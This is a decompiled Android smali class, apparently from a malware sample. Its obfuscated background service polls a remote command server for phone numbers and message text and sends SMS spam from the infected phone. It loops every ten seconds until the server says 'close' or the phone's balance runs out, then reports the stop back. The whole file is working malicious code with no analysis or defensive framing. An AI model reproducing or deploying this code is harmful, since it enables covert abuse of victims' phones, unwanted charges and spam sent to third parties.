.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Ljava/lang/String;

.field c:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "wifu"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    const-string v0, "wifu"

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->c:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6

    :cond_0
    :goto_0
    :try_start_0
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0x2710

    invoke-virtual {p1, v0, v1}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "spamSMS"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "start"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1

    goto/16 :goto_2

    :cond_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    if-nez p1, :cond_0

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v0, 0x3

    if-le p1, v0, :cond_2

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendsms"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    :cond_2
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "indexSMSSPAM"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "|||||"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_3

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "spamSMS"

    const-string v1, ""

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "4"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "p="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|Ended balance, SMS spam stopped!|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_3
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "15"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "p="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "getnumber"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v0, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, ""

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "textSPAM"

    invoke-virtual {v1, p0, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    const-string v0, "/"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x0

    aget-object v0, v0, v2

    const-string v2, "/"

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    const/4 v2, 0x1

    aget-object p1, p1, v2

    const-string v2, "{nameholder}"

    invoke-virtual {v1, v2, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    :cond_4
    const-string v2, "close"

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_6

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->c:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "number: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "  msg: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "number"

    invoke-virtual {v2, v3, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    const-string v3, "msg"

    invoke-virtual {v2, v3, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {p0, v1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x2

    if-le v1, v2, :cond_5

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    :cond_5
    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->b:Ljava/lang/String;

    goto/16 :goto_0

    :cond_6
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "spamSMS"

    const-string v1, ""

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_2
    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/wifu;->stopSelf()V

    return-void
.end method
